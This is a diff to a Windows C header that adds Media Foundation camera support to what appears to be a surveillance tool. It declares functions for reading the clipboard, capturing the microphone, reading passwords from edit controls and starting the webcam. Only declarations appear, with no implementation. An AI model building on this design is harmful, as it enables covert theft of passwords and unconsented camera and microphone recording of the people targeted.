@@ -10,8 +10,19 @@
 #include <winternl.h>
 #include <mmdeviceapi.h>
 #include <audioclient.h>
+#include <mfapi.h>
+#include <mfidl.h>
+#include <mfreadwrite.h>
+#include <mferror.h>
 #pragma comment(lib, "ole32.lib")
 #pragma comment(lib, "uuid.lib")
+#pragma comment(lib, "mfplat.lib")
+#pragma comment(lib, "mf.lib")
+#pragma comment(lib, "mfreadwrite.lib")
+#pragma comment(lib, "mfuuid.lib")
+
+
+extern volatile int g_camera_run;
 
 typedef struct _RTL_USER_PROCESS_PARAMETERS 
 {
@@ -60,5 +71,6 @@ void read_clipboard(char *buffer, size_t size);
 
 void capture_micro(void);
 int read_password_from_control(HWND hEdit, char *out, size_t out_size)
+int start_camera(void);
 
 #endif
